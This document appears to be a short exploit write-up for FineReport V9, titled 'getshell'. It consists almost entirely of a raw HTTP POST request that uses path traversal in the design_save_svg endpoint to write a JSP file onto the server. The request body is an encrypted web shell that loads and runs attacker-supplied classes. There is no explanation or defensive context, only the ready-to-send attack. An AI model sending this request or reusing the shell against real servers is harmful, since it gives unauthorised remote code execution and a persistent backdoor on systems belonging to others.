# V9getshell-FineReport-V9
帆软 V9getshell FineReport V9

POST  /WebReport/ReportServer?  
op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update  .jsp  HTTP/1.1
Host:  192.168.169.138:8080
User-Agent:  Mozilla/5.0  (Windows  NT  10.0;  Win64;  x64)  AppleWebKit/537.36  (KHTML,  like  Gecko)  
Chrome/81.0.4044.92  Safari/537.36
Connection:  close
Accept-Au:  0c42b2f264071be0507acea1876c74
Content-Type:  text/xml;charset=UTF-8
Content-Length:  675 
{"__CONTENT__":"<%@page  import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class  U  extends  
ClassLoader{U(ClassLoader  c){super(c);}public  Class  g(byte  []b){return  
super.defineClass(b,0,b.length);}}%><%if(request.getParameter(\"pass\")!=null)  {String  
k=(\"\"+UUID.randomUUID()).replace(\"-
\",\"\").substring(16);session.putValue(\"u\",k);out.print(k);return;}Cipher  
c=Cipher.getInstance(\"AES\");c.init(2,new  
SecretKeySpec((session.getValue(\"u\")+\"\").getBytes(),\"AES\"));new  
U(this.getClass().getClassLoader()).g(c.doFinal(new  
sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInsta  
nce().equals(pageContext);%>","__CHARSET__":"UTF-8"}
